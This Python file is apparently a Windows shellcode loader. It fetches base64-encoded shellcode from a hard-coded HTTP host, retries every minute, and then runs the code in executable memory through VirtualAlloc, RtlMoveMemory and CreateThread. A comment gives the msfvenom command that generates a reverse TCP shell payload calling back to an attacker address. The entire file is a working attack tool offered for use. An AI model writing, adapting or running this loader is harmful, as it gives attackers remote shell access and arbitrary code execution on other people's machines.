import ctypes
import base64
from time import sleep
from urllib import request

# msfvenom -f raw -p windows/x64/shell_reverse_tcp LHOST=192.168.10.179 LPORT=9999 | base64 -w 0 > shellcode.b64
URL = "http://192.168.43.130:8000/shellcode.b64"

def get_shellcode(URL):
    try:
        with request.urlopen(URL) as response:
            shellcode = base64.decodebytes(response.read())
    except:
        return None
    else:
        return shellcode


def main():

    # This will loop forever until the shellcode is recieved and is in correct format.
    while (shellcode := get_shellcode(URL)) == None: sleep(60)

    # Specifying the return type for VirtualAlloc
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    # Allocating space for the shellcode
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_void_p(0), 
                                          ctypes.c_uint(len(shellcode)), 
                                          ctypes.c_uint(0x3000), 
                                          ctypes.c_uint(0x40))

    # shellcode to char
    buf = ctypes.create_string_buffer(shellcode)

    # copying shellcode to memory
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(ptr), 
                                     buf, 
                                     ctypes.c_uint(len(shellcode)))

    # run our shellcode as a thread
    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_uint(0), 
                                         ctypes.c_uint(0), 
                                         ctypes.c_void_p(ptr), 
                                         ctypes.c_void_p(0), 
                                         ctypes.c_uint(0), 
                                         ctypes.pointer(ctypes.c_uint(0)))
    
    # waiting for the thread to stop execution.
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_void_p(ht), ctypes.c_uint(-1))

if __name__ == "__main__":
    main()
